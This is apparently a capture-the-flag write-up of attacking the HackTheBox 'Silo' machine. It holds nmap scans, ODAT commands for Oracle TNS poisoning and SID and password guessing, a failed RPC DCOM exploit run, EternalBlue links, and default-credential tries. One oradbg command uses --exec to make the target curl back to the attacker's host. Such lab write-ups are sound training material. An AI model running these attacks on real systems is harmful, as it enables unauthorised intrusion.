```
root@kali [18:59:03] [~] 
-> # nmap 10.10.10.82 -sC -sV -n --top-ports 10000 -vvv

Starting Nmap 7.60 ( https://nmap.org ) at 2018-08-01 19:52 BST
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:52
Completed NSE at 19:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:52
Completed NSE at 19:52, 0.00s elapsed
Initiating Ping Scan at 19:52
Scanning 10.10.10.82 [4 ports]
Completed Ping Scan at 19:52, 0.17s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:52
Scanning 10.10.10.82 [8296 ports]
Discovered open port 80/tcp on 10.10.10.82
Discovered open port 139/tcp on 10.10.10.82
Discovered open port 445/tcp on 10.10.10.82
Increasing send delay for 10.10.10.82 from 0 to 5 due to 11 out of 31 dropped probes since last increase.
Discovered open port 135/tcp on 10.10.10.82
Discovered open port 49158/tcp on 10.10.10.82
Discovered open port 1521/tcp on 10.10.10.82
Increasing send delay for 10.10.10.82 from 5 to 10 due to max_successful_tryno increase to 4
Discovered open port 49160/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 23.90% done; ETC: 19:54 (0:01:39 remaining)
Discovered open port 49161/tcp on 10.10.10.82
Discovered open port 49154/tcp on 10.10.10.82
Discovered open port 49155/tcp on 10.10.10.82
Discovered open port 5985/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 43.83% done; ETC: 19:54 (0:01:18 remaining)
Discovered open port 49152/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 61.62% done; ETC: 19:54 (0:00:57 remaining)
Discovered open port 47001/tcp on 10.10.10.82
SYN Stealth Scan Timing: About 80.12% done; ETC: 19:54 (0:00:30 remaining)
Increasing send delay for 10.10.10.82 from 10 to 20 due to 1873 out of 6241 dropped probes since last increase.
Discovered open port 49153/tcp on 10.10.10.82
Completed SYN Stealth Scan at 19:57, 293.42s elapsed (8296 total ports)
Initiating Service scan at 19:57
Scanning 14 services on 10.10.10.82
Service scan Timing: About 57.14% done; ETC: 19:59 (0:00:44 remaining)
Completed Service scan at 19:59, 119.18s elapsed (14 services on 1 host)
NSE: Script scanning 10.10.10.82.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:59
Completed NSE at 19:59, 11.59s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:59
Completed NSE at 19:59, 0.01s elapsed
Nmap scan report for 10.10.10.82
Host is up, received echo-reply ttl 127 (0.13s latency).
Scanned at 2018-08-01 19:52:26 BST for 425s
Not shown: 8282 closed ports
Reason: 8282 resets
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   syn-ack ttl 127 Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  oracle-tns   syn-ack ttl 127 Oracle TNS listener (requires service name)
49161/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25807/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 52707/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38458/udp): CLEAN (Timeout)
|   Check 4 (port 55366/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2018-08-01 19:59:21
|_  start_date: 2018-08-01 19:21:58

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:59
Completed NSE at 19:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:59
Completed NSE at 19:59, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 425.79 seconds
           Raw packets sent: 13072 (575.144KB) | Rcvd: 9867 (394.732KB)

```

From that IIS version we can work out what OS the system is running, since IIS only runs on specific versions of Windows/Windows Server. 

The version in this case is `8.5`, which means (after a quick Google) that we're running `Windows Server 2012 R2`. The third link down on my Google list was the Enternal Blue exploit, but we'll leave that one alone for the moment, as I don't think this is going to be that easy (maybe it will, but we'll recon it further still)

[Eternal Blue](https://www.exploit-db.com/exploits/42315/)

`Oracle TNS listener 11.2.0.2.0 (unauthorized)`

That's the most interesting, other than the IIS server, which appears to be a rabbit-hole, but we can scan it anyway and see if we find anything. 

`dirb http://10.10.10.82`

Digging around the internet I came across the following tool, which is proving to be most useful so far. 

[ODAT by Quentin Hardy](https://github.com/quentinhardy/odat)

`./odat.py tnspoison -s 10.10.10.82 -d ORCL --test-module`

OK, it's vulnerable.

Guess we do something like this next?

`./odat.py sidguesser -s 10.10.10.82 -d ORCL --sids-file="./sids.txt"`

O.K, that's a lot of output, I'm gonna go ahead and say that we can put pretty much whatever we want as our SID, until I find out that it actually matters (which it might, so we're going to try something sensible and see if the output changes)

`./odat.py passwordguesser -s 10.10.10.82 -d LISTENER --accounts-files accounts/logins.txt accounts/pwds.txt`

Nope, that did nothing useful. 

```
root@kali [22:03:57] [~/Silo/odat] [master *]
-> # ./odat.py tnscmd -s 10.10.10.82 -p 1521 --ping

[1] (10.10.10.82:1521): Searching ALIAS on the 10.10.10.82 server, port 1521
[+] 1 ALIAS received: ['LISTENER']. You should use this alias (more or less) as Oracle SID.
```


OK. Also, I will do that, thank you for the hint. 

```
root@kali [22:05:18] [~/Silo/odat] [master *]
-> # ./odat.py tnscmd -s 10.10.10.82 -p 1521 --version

[1] (10.10.10.82:1521): Searching the version of the Oracle database server (10.10.10.82) listening on the port 1521
[+] The remote database version is: '11.2.0.2.0.'
```

Interesting (I already got this from Nmap, but still its nice to get confirmation)

```
root@kali [22:05:58] [~/Silo/odat] [master *]
-> # ./odat.py tnscmd -s 10.10.10.82 -p 1521 --status 

[1] (10.10.10.82:1521): Searching the server status of the Oracle database server (10.10.10.82) listening on the port 1521
[+] Data received by the database server: ''\x00a\x00\x00\x04\x00\x00\x00"\x00\x00U(DESCRIPTION=(ERR=12618)(VSNNUM=186647040)(ERROR_STACK=(ERROR=(CODE=12618)(EMFI=4))))''
```

Well, this might be something useful... it might not, but it's worth a quick Google.

Back to `nmap` for a second, I'm a interested in what these other services have to offer.

`nmap -sU -sS --script smb-security-mode.nse -p U:135,T:139 10.10.10.82`

```
root@kali [22:18:46] [~/Silo/odat] [master *]
-> # nmap -sU -sS --script smb-security-mode.nse -p U:135,T:139 10.10.10.82

Starting Nmap 7.60 ( https://nmap.org ) at 2018-08-01 22:21 BST
Nmap scan report for 10.10.10.82
Host is up (0.051s latency).

PORT    STATE  SERVICE
139/tcp open   netbios-ssn
135/udp closed msrpc

Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds
```

Hmmm

```
root@kali [22:21:21] [~/Silo/odat] [master *]
-> # nmap -sU -sS --script smb-security-mode.nse -p T:135,T:139 10.10.10.82

Starting Nmap 7.60 ( https://nmap.org ) at 2018-08-01 22:21 BST
WARNING: UDP scan was requested, but no udp ports were specified.  Skipping this scan type.
Nmap scan report for 10.10.10.82
Host is up (0.052s latency).

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn

Nmap done: 1 IP address (1 host up) scanned in 11.28 seconds
```

Interesting... (unless I'm just being an idiot and MSRPC runs on TCP usually... tbh that's something I should Google real quick)

... I was being an idiot, that's where it runs, so the UDP scan wasn't nesseccary, although it is interesting that the netbios-ssn port responded on both protocols.

OK, so first thing we get if we Google `netbios-ssn` is the following: 

[Exploit DB Link](https://www.exploit-db.com/exploits/76/)

```
root@kali [22:37:36] [~/Silo] 
-> # ./2003-0605 -d 10.10.10.82                       
RPC DCOM remote exploit - .:[oc192.us]:. Security
[+] Resolving host..
[+] Done.
-- Target: [Win2k-Universal]:10.10.10.82:135, Bindshell:666, RET=[0x0018759f]
[-] Couldnt connect to bindshell, possible reasons:
    1:  Host is firewalled
    2:  Exploit failed
```

I didn't expect that to work, so let's try something that I looked earlier but put to one side, because if it works then this box is lame. 

Two different versions of the EternalBlue script (both by the same guy apparently?)

[Eternal Blue 1](https://www.exploit-db.com/exploits/42030/)
[Eternal Blue 2](https://www.exploit-db.com/exploits/42315/)

The one that actually works, in the sense of "it didn't error and fail to run", for me, was the first one. However it looks like I need to make some shellcode, which I think requires me to use `msfvenom`, but we're not quite there yet. And the box is called "Silo", Silo meaning storage, a place to keep things when you have too much of them. That screams "Look at the freaking database!", so we'll go back to poking at the Oracle TNS thing. 

Seems we can set up a listening port on the TNS listener (make sense) so lets do just that, and see what happens. 

```
root@kali [23:06:17] [~/Silo] 
-> # odat/odat.py tnspoison -s 10.10.10.82 -d ORCL --poison --listening-port 9999


[1] (10.10.10.82:1521): Local proxy on port 9999 and TNS poisoning attack to 10.10.10.82:1521 are starting. Waiting for connections...
```

Not a lot sadly, it just kinda sits there. We'll give it a few minutes and see if we get anything pop up. I started it at 23:06... 

Ok, nothing had happened by 23:10, so I gave up, however, I did find the following...


[oradbg](https://github.com/quentinhardy/odat/wiki/oradbg)

However, it requires us to know the username and password.

We can have a guess?

```
Username: scott
Password: tiger
```

(That's the default OracleDB password for some reason, it has something to do with someones kid and a cat? I can't remember)

Welp, nuts to that idea, it seems either my Kali build is broken or the tool itself isn't running (or more likely being used) correctly. I keep getting the following error:

```
root@kali [23:10:38] [~/Silo] 
-> # odat/odat.py oradbg -s 10.10.10.82 -d LISTENER -U scott -P tiger --exec "/bin/curl http://10.10.14.126:8000"
23:15:07 CRITICAL -: Impossible to connect to the remote database: DPI-1047: 64-bit Oracle Client library cannot be loaded: "libclntsh.so: cannot open shared object file: No such file or directory". See https://oracle.github.io/odpi/doc/installation.html#linux for help
```


Womp womp. 

(gonna give `apt install libaio1 libaio-dev` a whirl and see if that fixes it)

Let's look elsewhere for enlightenment (get it because the Oracle? (sorry)) 

OK, so `odat.py` gives us the following options, we already know that a few of them work (although we're not entirely sure what some of them are doing) 

- tnscmd 
- tnspoison
- sidguesser
- passwordguesser
- utlhttp
- utltcp
- httpuritype
- ctxsys
- externaltable
- dbmsxslprocessor
- dbmsadvisor
- utlfile
- dbmsscheduler
- java
- passwordstealer
- oradbg
- dbmslob
- stealremotepwds
- userlikepwd
- smb
- privesc
- cve
- search
- unwrapper
- clean

The first few work, we have seen this to be true. We also have a few more interesting options in the form of `privesc` (for later on) `cve` which should be our next port of call. `smb` which we're definitely going to have a nose at. `java` meh, `dbmslob` no idea what that is, so we'll give it a whirl. And a few others, I won't post all the results, just the ones that get us somewhere.

